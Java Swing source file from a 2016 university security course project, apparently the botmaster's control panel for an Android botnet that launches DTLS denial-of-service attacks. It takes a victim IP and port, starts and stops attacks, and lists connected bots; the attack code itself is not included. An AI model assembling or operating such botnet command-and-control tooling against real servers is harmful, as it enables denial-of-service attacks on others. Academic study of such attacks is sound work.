/**
 *                     Πανεπιστήμιο Αιγαίου
 *      Τμήμα Μηχανικών Πληροφοριακών & Επικοινωνιακών Συστημάτων
 * 
 *          Ασφάλεια Ασύρματων & Κινητών Δικτύων Επικοινωνιών
 *                     Εαρινό Εξάμηνο 2016
 *                      Project Μαθήματος
 * 
 * Δημιουργία secure botnet με android clients & Dos/DDoS σε DTLS Server.
 * 
 *          Πέππας Κωνσταντίνος 321/2011134 - icsd11134@icsd.aegean.gr
 *          Σωτηρέλης Χρήστος   321/2012182 - icsd12182@icsd.aegean.gr
 *          Χαϊκάλης Νικόλαος   321/2012200 - icsd12200@icsd.aegean.gr
 * 
 *          Καθηγητής Μαθήματος: Γ. Καμπουράκης 
 * 
 */

import botnet.botmasterandroidclient.Attack_Properties;
import java.awt.Dimension;
import java.awt.GridLayout;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.event.WindowAdapter;
import java.awt.event.WindowEvent;
import java.io.Serializable;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import javax.swing.JButton;
import javax.swing.JComboBox;
import javax.swing.JFrame;
import javax.swing.JLabel;
import javax.swing.JOptionPane;
import javax.swing.JPanel;
import javax.swing.JScrollPane;
import javax.swing.JTable;
import javax.swing.JTextField;
import javax.swing.table.DefaultTableModel;
import botnet.botmasterandroidclient.*;


public class GUI extends JPanel implements Serializable{
    private JButton attackButton, botListButton;
    private JLabel Label_victims_ip, Label_victims_port, Label_proxy_ip, Label_proxy_port, OnlineBots;
    private JComboBox comboB = new JComboBox();
    private JTextField victims_ip, victims_port, proxy_ip, proxy_port;
    private String ComboChoice = "Select one attack";
     // private GridBagConstraints gbc;
    private BotMasterCnC_Chat Master = new BotMasterCnC_Chat();
    
    GUI(BotMasterCnC_Chat Master){
        this.Master = Master;
    }
    public void createGUI() 
    {
        NewGUI();
        JFrame f1=new JFrame();
        
        f1.addWindowListener(new WindowAdapter()
        {
            @Override
            public void windowClosing(WindowEvent e)
            {
                Master.StopConnection();
                f1.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            }
        });
        f1.setLayout(new GridLayout(8,2));
        f1.setSize(600,400);
        f1.setTitle("BotMaster Client");
        victims_ip=new JTextField("");
        victims_port=new JTextField("");
        proxy_ip=new JTextField("");
        proxy_port=new JTextField("");
        attackButton=new JButton("Start Attack");
        botListButton = new JButton("Online Bots");
        Label_victims_ip=new JLabel("Victim's ip");
        Label_victims_port=new JLabel("Victim's port");
        Label_proxy_ip=new JLabel("proxy ip");
        Label_proxy_port=new JLabel("proxy port");
        OnlineBots = new JLabel("Online BotS");
        String[] dial = {"Select one attack", "DTLS DoS"};
        
        for(int i=0;i<dial.length;i++){
            comboB.addItem(dial[i]);
        }
        
        
        comboB.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
               String Choice= comboB.getSelectedItem().toString();
               ComboChoice = (String) Choice;
               System.out.println(Choice);
       
            }
        });
        
        attackButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
               String button = attackButton.getText().toString();
                System.out.println("234");
                if(button.equalsIgnoreCase("Start Attack")){
                    if(victims_ip.getText().isEmpty() || victims_port.getText().isEmpty() || ComboChoice.equalsIgnoreCase("Select one attack")){
                        final JPanel panel = new JPanel();
                         JOptionPane.showMessageDialog(panel, "Some Fields are empty", "Error", JOptionPane.ERROR_MESSAGE);
                    }
                    else{
                        attackButton.setText("Stop Attack");
                        int port = Integer.parseInt(victims_port.getText().toString());
                        Attack_Properties ap = new Attack_Properties(victims_ip.getText().toString(), ComboChoice.toString(), port);
                        Master.StartAttack(ap);
                    }
                }
                else if(button.equalsIgnoreCase("Stop Attack")){
                    attackButton.setText("Start Attack");
                    Master.StopAttack();
                }
       
            }
        });
        botListButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {
                FixTable();
            }
        });

        
        f1.add(Label_victims_ip);
        f1.add(victims_ip);
        f1.add(Label_victims_port);
        f1.add(victims_port);
        f1.add(comboB);
        f1.add(attackButton);
        f1.add(OnlineBots);
        f1.add(botListButton);
        f1.setVisible(true);
    }
    
    void NewGUI(){
        try {
        for (javax.swing.UIManager.LookAndFeelInfo info : javax.swing.UIManager.getInstalledLookAndFeels()) {
            if ("Nimbus".equals(info.getName())) {
                javax.swing.UIManager.setLookAndFeel(info.getClassName());
                break;
            }
        }
        } catch (ClassNotFoundException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (InstantiationException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (IllegalAccessException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        } catch (javax.swing.UnsupportedLookAndFeelException ex) {
            java.util.logging.Logger.getLogger(GUI.class.getName()).log(java.util.logging.Level.SEVERE, null, ex);
        }
    }
    
    void FixTable(){
        ArrayList<Bot_Properties> botList = new ArrayList();
        JFrame f2=new JFrame();
        SimpleDateFormat formatter = new SimpleDateFormat("ss");
        String CurSec = formatter.format(new Date()); 
        int secs = Integer.parseInt(CurSec);
        while(true){
            try{
                botList = Master.getBotList();
                System.out.println(botList.get(0).getBotPCname());
                System.out.print("");
                break;
            }
            catch(IndexOutOfBoundsException ex){
                CurSec = formatter.format(new Date()); 
                int newSecs = Integer.parseInt(CurSec);
                if(newSecs - 4 >= secs){
                    System.out.println("Old secs:" + secs + "\n" + "newSecs: " + newSecs);
                    final JPanel panel = new JPanel();
                    JOptionPane.showMessageDialog(panel, "List is Empty.", "Error", JOptionPane.ERROR_MESSAGE);
                    break;
                }
            }
        }
        
        String columnNames[] = {"Host Name", "Host Address"};
        DefaultTableModel tableModel = new DefaultTableModel(columnNames, 0);
        for(int i=0;i<botList.size();i++)
        {
        Object[] objs={botList.get(i).getBotPCname(), botList.get(i).getBotIP()};
        
        tableModel.addRow(objs);
        }

        JTable table = new JTable(tableModel);
        final JScrollPane sp1 = new JScrollPane();
        sp1.setPreferredSize(new Dimension(600, 200));
        sp1.setViewportView(table);
        table.setEnabled(false);
        f2.add(sp1);
        f2.pack();
        f2.setVisible(true);
    }
    
}
